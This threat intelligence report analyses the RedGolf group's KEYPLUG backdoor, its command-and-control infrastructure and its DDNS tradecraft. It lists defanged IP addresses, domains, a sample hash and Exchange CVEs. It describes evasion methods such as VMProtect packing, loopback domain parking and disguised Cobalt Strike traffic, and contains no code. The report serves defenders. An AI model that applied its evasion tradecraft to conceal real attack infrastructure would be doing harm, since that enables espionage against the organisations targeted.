With KEYPLUG, China’s
RedGolf Spies On,
Steals From Wide Field of Targets

CYBER THREAT ANALYSIS | CHINA

Executive Summary
Recorded Future’s Insikt Group has identified a large cluster of new operational infrastructure
associated with use of the custom Windows and Linux backdoor KEYPLUG. We attribute this activity to
a threat activity group tracked as RedGolf, which is highly likely to be a Chinese state-sponsored group.
RedGolf closely overlaps with threat activity reported in open sources under the aliases APT41/BARIUM
and has likely carried out state-sponsored espionage activity in parallel with financially motivated
operations for personal gain from at least 2014 onward. A 2020 US Department of Justice (DOJ)
indictment states that a RedGolf-associated threat actor boasted of connections to the Chinese
Ministry of State Security (MSS); the indicted actors were also linked to the Chengdu-based company
Chengdu 404 Network Technology (成都市肆零肆网络科技有限公司).
The group remains highly active within a wide range of geographies and industry verticals, targeting
aviation, automotive, education, government, media, information technology, and religious organizations
(1, 2, 3). Organizations operating in these industries — particularly those whose products or activities
may be of strategic interest to the Chinese government and security services — are at increased risk of
targeting. RedGolf has historically exploited public and zero-day vulnerabilities in internet-facing
devices for initial access, including Citrix, Cisco, and Zoho. Maintaining a frequent patching cadence for
these devices is essential for addressing known security issues.
RedGolf used a Linux version of the custom, modular backdoor KEYPLUG to target US state
government entities during 2021 and 2022. Insikt Group has identified a wider cluster of KEYPLUG
samples and infrastructure used by RedGolf from at least 2021 to 2023. We track this malicious
infrastructure using the term GhostWolf. Alongside KEYPLUG, we also identified RedGolf using Cobalt
Strike, PlugX, and Dynamic DNS (DDNS) domains, all of which are commonly used by many Chinese
state-sponsored threat groups. Insikt Group identified multiple infrastructure overlaps between publicly
reported APT41/BARIUM campaigns across the GhostWolf infrastructure cluster.

Threat/Technical Analysis
KEYPLUG Malware
KEYPLUG is a custom, modular backdoor deployed by RedGolf that has Windows and Linux versions.
RedGolf heavily used KEYPLUG between May 2021 and February 2022 in a campaign that compromised
at least 6 US state governments. KEYPLUG C2 traffic supports at least 5 network protocols, including
HTTP, TCP, KCP over UDP, and WSS.
From the KEYPLUG samples published by Mandiant and by hunting for samples communicating with
GhostWolf infrastructure, we identified 9 more KEYPLUG samples that are highly likely used by RedGolf.

We identified 3 KEYPLUG samples that employed VMProtect, which RedGolf has commonly used to
package malware to hinder detection and analysis. The version of VMProtect we detected likely was
the same as in previous detections, but the version of Microsoft Linker ranged between 10.0 and 14.0.
The sample, “alibaba.exe”, is likely a later version of KEYPLUG given that it was packaged with a newer
version of Microsoft Linker and had the WSS C2 capability described by Mandiant.

GhostWolf Infrastructure
We identified a commonality across multiple servers found within RedGolf’s infrastructure. We track this
unique infrastructure TTP as GhostWolf; this configuration has been in use since at least December
2020 and is still in use.
This GhostWolf configuration is very likely linked to KEYPLUG C2 infrastructure given frequent overlaps
with publicly identified KEYPLUG samples and the additional samples identified in Table 1 above. Some
GhostWolf infrastructure has also been linked to other RedGolf-associated malware, including PlugX.
Figure 3 below shows the number of unique GhostWolf IP addresses observed over the past 2 years.
There is a distinct reduction in the number of servers detected towards the end of 2022, a trend that is
also reflected in the previous year’s data.

Figure 3: RedGolf GhostWolf infrastructure detections, December 2020 to February 2023 (Source: Recorded Future)

Throughout January 2022 to February 2023, we observed 11 hosting providers used for 42 GhostWolf
IP addresses; there was no discernible trend in the choice of providers used, but the majority of
infrastructure was located in Asia, with the remainder in the United States, as depicted in Figure 5. The
spread of providers is likely a conscious decision by the threat actors to diversify their malicious
infrastructure.

Recorded Future® | www.recordedfuture.com

CYBER THREAT ANALYSIS | CHINA

On 4 occasions, we identified consecutively or closely assigned IP addresses used for GhostWolf
infrastructure (for example, 23.225.199[.]162, 23.225.199[.]164, 23.225.199[.]165). We have previously
observed block assignment of IP addresses to a threat actor when the associated infrastructure is
purchased from a hosting reseller. Buying infrastructure from a reseller rather than directly from the
provider reduces the risk of the infrastructure being traced back to an individual. Figure 5 below shows
the overlap in hosting providers and their use throughout January 2022 to February 2023.

A full list of GhostWolf infrastructure can be found in Appendix A.

DDNS Tradecraft
Through persistent monitoring of previously reported infrastructure that has been publicly attributed to
APT41 and BARIUM (1, 2), we identified a cluster of Dynamic DNS (DDNS) domains and infrastructure
highly likely used across multiple campaigns by RedGolf. Over the past 2 years, this cluster has included
command and control (C2) servers for Cobalt Strike and PlugX malware and has links to infrastructure
used for KEYPLUG malware.
We track DNS resolution changes for domains in this cluster, 2 of which (ltupdate[.]ddns[.]net and
cloudat[.]ddns[.]net ) have been active in January 2023. These domains resolved to a Cobalt Strike C2
IP address, 193.239.154[.]221 , which Recorded Future first identified on May 2, 2022. Further
information about RedGolf's Cobalt Strike activity is included in the following section of this report.

CTA-CN-2023-0330

Recorded Future® | www.recordedfuture.com

CYBER THREAT ANALYSIS | CHINA

RedGolf threat actors have been frequently observed updating their DDNS domains to resolve to
operational infrastructure for short periods of time, typically less than 24 hours, before parking the
domains on loopback IP address 127.0.0[.]1 while not in use. This is a common tactic employed by threat
actors to subvert security teams and reduce the exposure of their infrastructure.
Alongside its DDNS use, we have also observed RedGolf using both traditionally registered domains and
free-to-register domains from TLDs such as .tk, .cf and .ml. Over the past 4 months, however, RedGolf’s
use of DDNS domains has decreased, with resolution changes and new domains becoming less
frequent. Further, in March 2023, Freenom, a provider of free-to-register domains including .tk, .cf, and
.ml, halted the registration of new free domains after a lawsuit filed by social media giant Meta. A full list
of indicators has been provided in Appendix A.

Cobalt Strike
Insikt Group identified 2 active Cobalt Strike C2 servers likely used by RedGolf, which both implemented
a jQuery Malleable profile. Historically, the majority of RedGolf-associated Cobalt Strike C2s found in
this cluster of infrastructure have also used a jQuery Malleable profile and in some cases were also
detected using cs2modrewrite. Threat actors use malleable profiles with Cobalt Strike to change the
appearance of its network traffic in order to evade detection. Modifying the way the traffic looks can
make it appear less suspicious and blend in with normal network traffic, making it harder for defenders
to identify and detect the malicious activity.
The most recently active RedGolf Cobalt Strike infrastructure has been active for substantially longer
than other RedGolf Cobalt Strike C2s we detected.

Links to APT41/BARIUM Activity
A March 2022 Mandiant report detailing APT41’s targeting US state governments included KEYPLUG
samples and linked infrastructure; we identified one of the KEYPLUG.LINUX samples mentioned in the
report (SHA256: e024ccc4c72eb5813cc2b6db7975e4750337a1cc619d7339b21fdbb32d93fd85),
hosted on IP address 103.226.155[.]96 during September 2022 with a small number of other KEYPLUG
samples.
A November 2020 blog from Microsoft’s Threat Intelligence Center (MSTIC) detailed methods for
hunting BARIUM using Microsoft’s Azure Sentinel platform and provided indicators of compromise
within detection rules. We observed infrastructure overlaps between the domains (portomnail[.]com
and openmd5[.]com ) reported by MSTIC and PlugX C2 infrastructure, IP address 137.220.178[.]43 . We
observed this C2 targeting mail servers in early to mid-2021, with this activity likely tied to the
exploitation of 4 Microsoft Exchange Server vulnerabilities (CVE-2021-26855, CVE-2021-26857,
CVE-2021-26858, CVE-2021-27065) released in March 2021. These domains also have hosting overlaps
with IP addresses observed within the identified DDNS cluster.

Mitigations
A previous Insikt Group report provides a comprehensive breakdown of detection and mitigation
techniques related to Cobalt Strike.
Recorded Future proactively detects both Cobalt Strike and PlugX servers and are logged in the
Command and Control Security Control Feed. Recorded Future clients can incorporate this feed into
blocking lists and alerting to help prevent infections.

Outlook
RedGolf will likely continue to target victims with KEYPLUG malware and its derivatives using command
and control infrastructure spanning a variety of hosting providers and likely purchased through a
hosting reseller. The group has previously used a mixture of traditionally registered domains and DDNS
domains, often featuring a technology theme. This TTP is likely to remain relatively unchanged, with the
exception of a decrease in DDNS use.
The use of Cobalt Strike and PlugX to target victim machines by Chinese state-sponsored threat
activity groups such as RedGolf is highly likely to continue given the feature set provided by these tools,
their ready availability, and the ability to obfuscate responsibility due to the number of other threat
actors using these techniques.
